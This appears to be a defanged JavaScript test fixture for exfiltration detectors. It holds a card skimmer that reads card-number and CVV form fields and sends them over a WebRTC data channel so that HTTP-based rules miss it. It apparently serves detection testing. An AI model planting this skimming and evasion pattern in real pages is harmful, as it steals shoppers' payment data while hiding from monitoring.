// DEFANGED TEST FIXTURE: a skimmer that exfiltrates over a WebRTC data channel instead of
// HTTP. It names no URL, so HTTP-based exfiltration rules see nothing.
(function () {
  var pc = new RTCPeerConnection();
  var ch = pc.createDataChannel("d");
  document.addEventListener("change", function () {
    var n = document.querySelector('input[name="cardnumber"]');
    var c = document.querySelector('input[name="cvv"]');
    if (n && c && ch.readyState === "open") ch.send(n.value + "|" + c.value);
  });
})();
